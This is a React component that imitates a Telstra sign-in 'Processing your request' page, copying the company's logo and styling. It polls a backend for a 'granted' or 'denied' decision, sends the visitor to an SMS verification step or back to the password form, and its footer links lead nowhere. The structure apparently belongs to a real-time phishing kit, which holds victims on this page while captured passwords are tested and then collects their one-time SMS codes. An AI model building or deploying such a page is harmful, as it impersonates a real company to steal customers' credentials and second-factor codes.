import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { Loader2, Clock, Shield } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";

export default function LoadingPage() {
  const [location, setLocation] = useLocation();
  const [requestId, setRequestId] = useState<string>("");

  // Extract request ID from URL params
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get('requestId') || '';
    setRequestId(id);
  }, []);

  // Poll for status updates every 2 seconds
  const { data: status } = useQuery({
    queryKey: ['/api/auth/status', requestId],
    enabled: !!requestId,
    refetchInterval: 2000, // Poll every 2 seconds
    retry: false,
  });

  // Handle status changes
  useEffect(() => {
    if (status) {
      if (status.status === 'granted') {
        // Redirect to SMS verification
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('username') || '';
        setLocation(`/sms?username=${encodeURIComponent(username)}`);
      } else if (status.status === 'denied') {
        // Redirect back to password step with error and keep username
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('username') || '';
        setLocation(`/login?username=${encodeURIComponent(username)}&error=incorrect_password`);
      }
    }
  }, [status, setLocation]);

  return (
    <div className="min-h-screen bg-white">
      {/* Telstra Header */}
      <header className="t-page-header">
        <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img" focusable="false">
          <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
            <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
              <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
              <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
            </g>
          </g>
        </svg>
      </header>

      <div role="main" className="t-form-container">
        <div className="text-center space-y-8">
          {/* Loading Animation */}
          <div className="mx-auto w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center">
            <Loader2 className="h-10 w-10 text-blue-600 animate-spin" />
          </div>
          
          <h1 className="t-able-heading-b">
            Processing your request
          </h1>
          
          <div className="t-able-text-bodyshort text-gray-600">
            Please wait while we verify your credentials and process your login request.
          </div>

          {/* Status Steps */}
          <div className="bg-gray-50 rounded-lg p-6 space-y-4">
            <div className="flex items-center gap-3 text-sm">
              <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
                <div className="w-3 h-3 bg-green-600 rounded-full"></div>
              </div>
              <span className="text-green-800">Credentials received</span>
            </div>
            
            <div className="flex items-center gap-3 text-sm">
              <div className="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center">
                <Loader2 className="w-3 h-3 text-blue-600 animate-spin" />
              </div>
              <span className="text-blue-800">Verifying your identity...</span>
            </div>
            
            <div className="flex items-center gap-3 text-sm text-gray-500">
              <div className="w-6 h-6 bg-gray-200 rounded-full flex items-center justify-center">
                <Shield className="w-3 h-3 text-gray-400" />
              </div>
              <span>Preparing secure access</span>
            </div>
          </div>

          {/* Wait Message */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <div className="flex items-start gap-3">
              <Clock className="h-5 w-5 text-blue-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm text-blue-900">
                <p className="font-medium mb-1">Please don't close this page</p>
                <p>This process usually takes a few moments. We'll redirect you automatically once verification is complete.</p>
              </div>
            </div>
          </div>

          {/* Loading dots animation */}
          <div className="flex justify-center items-center space-x-2">
            <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce"></div>
            <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></div>
            <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
          </div>
        </div>
      </div>

      <footer className="t-footer">
        <div className="t-footer-content">
          <p className="t-footer-copyright">Copyright © 2025 Telstra</p>
          <a 
            className="t-footer-privacy" 
            href="#" 
            target="_blank"
            data-testid="link-privacy"
          >
            Privacy
          </a>
          <a 
            className="t-footer-terms" 
            href="#" 
            target="_blank"
            data-testid="link-terms"
          >
            Terms of use
          </a>
        </div>
      </footer>
    </div>
  );
}